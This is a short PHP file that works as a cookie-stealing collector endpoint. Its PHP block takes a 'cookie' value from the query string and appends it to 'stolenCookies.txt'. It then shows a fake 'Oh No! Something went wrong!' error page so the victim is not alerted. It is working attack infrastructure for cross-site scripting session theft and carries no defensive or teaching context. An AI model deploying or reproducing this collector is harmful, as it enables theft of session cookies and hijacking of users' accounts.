<?php
	if (isset($_GET['cookie'])){
		$file = 'stolenCookies.txt';
		file_put_contents($file, $_GET['cookie'].PHP_EOL, FILE_APPEND);
	}
?>
<!DOCTYPE html>
	<html>
	<title> !Oops </title>
	<body>
	</style>
		<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
		<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Raleway">
	<style>
		body,h1,h2,h3,h4,h5 {font-family: "Raleway", sans-serif}
		a {color:blue;}
		h3 {color:blue;}
	</style>
		<h1 align="center"> Oh No! Something went wrong! </h1>
	</body>
</html> 